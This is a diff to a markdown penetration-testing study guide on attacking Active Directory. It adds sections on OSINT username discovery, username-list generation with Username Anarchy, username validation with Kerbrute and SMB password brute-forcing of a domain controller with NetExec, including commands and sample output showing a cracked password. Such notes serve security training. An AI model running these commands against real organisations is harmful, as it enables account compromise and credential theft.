@@ -1885,7 +1885,7 @@ As previously mentioned, `HKLM\SECURITY` contains cached domain logon informatio
 **Example hash**
 
 ```
-inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
+exampledomain.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
 ```
 
 **Run Hashcat against NT hashes**
@@ -2255,7 +2255,7 @@ Active Directory (AD) serves as the foundational directory service in over 90% o
 In this section, we will focus primarily on how we can extract credentials through the use of a dictionary attack against AD accounts and dumping hashes from the NTDS.dit file.
 
 <details>
-<summary><h2>Dictionary attacks against AD accounts using NetExec</h2></summary>
+<summary><h3>Dictionary attacks against AD accounts using NetExec</h3></summary>
 
 When a dictionary attack is appropriate, tailoring it to the target organization can improve results. Searching social media and the company’s website for employee directories can help identify staff names. Since most employees receive a username early on—and many organizations follow common naming conventions—this information can guide our attack.
 
@@ -2274,6 +2274,129 @@ Here are a few typical patterns to consider:
 | nickname                          | doedoehacksstuff                        |
 
 Often, an email address's structure will give us the employee's username (structure: username@domain). For example, from the email address jdoe@domain.com, we can infer that jdoe is the username.
+
+<details>
+<summary><h4>Advice: OSINT-Driven Username Enumeration Techniques</h4></summary>
+
+A common tactic for discovering corporate username formats involves leveraging publicly available information through strategic searches:
+
+1. **Email Discovery via Search Engines**
+
+Querying `@exampledomain.com` on Google often reveals valid email formats from:
+
+* Employee directories
+* Press releases
+* Conference attendee lists
+* GitHub commits (if corporate emails are exposed)
+
+2. **Social Media Scraping**
+
+Tools like LinkedIn Scraper or theHarvester can correlate names/roles with email patterns.
+
+3. **Document Metadata Analysis**
+
+Search `site:exampledomain.com filetype:pdf` to find:
+
+* Author fields in PDF properties (often contains internal usernames)
+* Watermarks in internal docs
+
+</details>
+
+<details>
+<summary><h4>Creating a custom list of usernames</h4></summary>
+
+After gathering employee names from OSINT research (e.g., LinkedIn, company websites), create a formatted username list for spraying attacks. For this demonstration, we’ll use a small sample set:
+
+* Ben Williamson  
+* Bob Burgerstien  
+* Jim Stevenson  
+* Jill Johnson  
+* Jane Doe  
+
+We can create a custom list using an automated list generator such as [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to convert a list of real names into common username formats.
+
+**Install**
+
+```bash
+git clone https://github.com/urbanadventurer/username-anarchy.git
+cd username-anarchy
+chmod +x username-anarchy
+```
+
+**Usage**
+
+```bash
+./username-anarchy -i /home/names.txt
+```
+
+> While automated tools accelerate list generation, investing time in identifying an organization’s exact username convention significantly improves attack success rates.
+
+</details>
+
+<details>
+<summary><h4>Enumerating valid usernames with Kerbrute</h4></summary>
+
+Before initiating password-based attacks, verifying username validity prevents wasted effort on non-existent accounts. Kerbrute streamlines this process.
+
+**Install**
+
+```bash
+wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute
+chmod +x kerbrute
+sudo mv kerbrute /usr/local/bin/
+```
+
+**Usage**
+
+```bash
+kerbrute userenum --dc <DC IP> --domain exampledomain.local /home/names.txt
+```
+
+Example output
+
+```bash
+# ...
+# 2025/04/25 09:17:10 >  Using KDC(s):
+# 2025/04/25 09:17:10 >   <DC IP>:<PORT>
+
+# 2025/04/25 09:17:11 >  [+] VALID USERNAME:       bwilliamson@exampledomain.local
+# ...
+```
+
+</details>
+
+<details>
+<summary><h4>Launching a brute-force attack with NetExec</h4></summary>
+
+Once we've identified the naming convention and gathered employee names or prepared a username list, we can launch a brute-force attack against the target Domain Controller using a tool like NetExec. By leveraging the SMB protocol, we can send logon attempts directly to the DC. 
+
+**Usage**
+
+```bash
+netexec smb <DC IP> -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
+```
+
+Example output
+
+```bash
+# SMB         <DC IP>     445    DC01           [*] Windows 10.0 Build 17763 x64 (name:DC-PAC) (domain:dac.local) (signing:True) (SMBv1:False)
+# SMB         <DC IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2017 STATUS_LOGON_FAILURE 
+# SMB         <DC IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2016 STATUS_LOGON_FAILURE 
+# SMB         <DC IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2015 STATUS_LOGON_FAILURE 
+# SMB         <DC IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2014 STATUS_LOGON_FAILURE 
+# SMB         <DC IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2013 STATUS_LOGON_FAILURE 
+# SMB         <DC IP>     445    DC01             [-] exampledomain.local\bwilliamson:P@55w0rd STATUS_LOGON_FAILURE 
+# SMB         <DC IP>     445    DC01             [-] exampledomain.local\bwilliamson:P@ssw0rd! STATUS_LOGON_FAILURE 
+# SMB         <DC IP>     445    DC01             [+] exampledomain.local\bwilliamson:P@55w0rd! 
+```
+
+In this example, NetExec uses SMB to attempt a login as user bwilliamson (-u) with a password list (-p) of common passwords located at `/usr/share/wordlists/fasttrack.txt`. Be aware that if an account lockout policy is in place, this attack could lock the targeted account.
+
+> **NOTE:** Understanding what artifacts an attack leaves behind is key to providing impactful remediation advice. On any Windows system, administrators can use Event Viewer to review Security logs and examine recorded actions. This insight can guide the implementation of stronger security controls and support post-breach investigations.
+
+Once credentials are obtained, we can attempt to gain remote access to the Domain Controller and extract the NTDS.dit file, which contains password hashes for all domain users.
+
+</details>
 
 </details>
 
